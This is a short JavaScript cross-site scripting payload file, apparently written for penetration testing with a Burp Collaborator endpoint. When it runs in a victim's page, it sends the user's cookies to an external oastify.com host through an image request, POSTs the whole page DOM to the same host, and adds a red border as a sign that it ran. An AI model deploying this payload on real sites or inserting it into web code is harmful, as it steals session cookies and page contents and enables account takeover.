// payload.js
(function(){
  console.log("[🔥] XSS payload.js executed");

  // 1. Send cookies to Burp Collaborator
  new Image().src = "https://aft0o7apafvlz829z8t1kj1fq6w2k08p.oastify.com/?c=" + encodeURIComponent(document.cookie);

  // 2. Send full DOM as POST request
  fetch("https://aft0o7apafvlz829z8t1kj1fq6w2k08p.oastify.com/dom", {
    method: "POST",
    mode: "no-cors",
    body: document.documentElement.outerHTML
  });

  // 3. Optional visual indicator
  document.body.style.border = "5px solid crimson";
})();
